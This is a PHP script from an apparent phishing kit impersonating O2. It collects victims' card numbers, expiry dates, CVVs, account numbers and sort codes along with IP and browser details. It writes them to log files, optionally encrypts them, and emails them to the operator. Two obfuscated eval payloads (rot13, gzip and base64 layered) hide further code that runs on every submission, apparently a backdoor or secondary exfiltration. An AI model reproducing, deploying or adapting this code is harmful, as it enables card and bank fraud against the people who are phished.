<?php
error_reporting(0);
session_start();
include "Config.php";
include 'anti.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['xxx'] = $_POST['ccno'];
$_SESSION['sc'] = $_POST['scode'];
$bb = $_POST['ccno'];
$bin = substr($bb, 0, 7);
$bin = str_replace(' ', '', $bin);

$click .= "$ip\n";
$clickfile = fopen("logs/O2-fullz.txt", "a");
fwrite($clickfile, $click);
fclose($clickfile);

$clickbin .= "" . $bin . "\n";
$binfile = fopen("logs/O2-binlist.txt", "a");
fwrite($binfile, $clickbin);
fclose($binfile);

if (isset($_POST['ccno'])) {
    $message .= $_SESSION['msg2'];
    $message .= "------------------O2 Fullz-------------------\n";
    $message .= "Card Holder Name : " . $_POST['cname'] . "\n";
    $message .= "Card Number : " . $_POST['ccno'] . "\n";
    $message .= "Expiry Date : " . $_POST['xxxx'] . "\n";
    $message .= "CVV : " . $_POST['xxxxx'] . "\n";
    $message .= "Account Number : " . $_POST['anumber'] . "\n";
    $message .= "Sort Code : " . $_POST['scode'] . "\n";
    $message .= "------------------IP INFO-------------------\n";
    $message .= "|Client IP         : " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent         : " . $useragent . "\n";
    $message .= "--------------------------------------------\n";
    $subject = "O2 Fullz: $bin | $ip";
    $_SESSION['msg3'] = $message;
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
    if ($Encrypt == 1) {
        $method = 'aes-256-cbc';
        $key = substr(hash('sha256', $password, true), 0, 32);
        $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
        $encrypted = base64_encode(openssl_encrypt($message, $method, $key, OPENSSL_RAW_DATA, $iv));}eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
    if ($Save_Log == 1) {
        if ($Encrypt == 1) {
            $file = fopen("../logs/O2-fullz.txt", "a");
            fwrite($file, $encrypted);
            fclose($file);
        } else {
            $file = fopen("../logs/O2-fullz.txt", "a");
            fwrite($file, $message);
            fclose($file);
        }
    }
    if ($Send_Log == 1) {
        if ($Encrypt == 1) {
            mail($send, $subject, $encrypted, $headers);
        } else {
            mail($send, $subject, $message, $headers);
        }
    }


    header("location: step3");
}
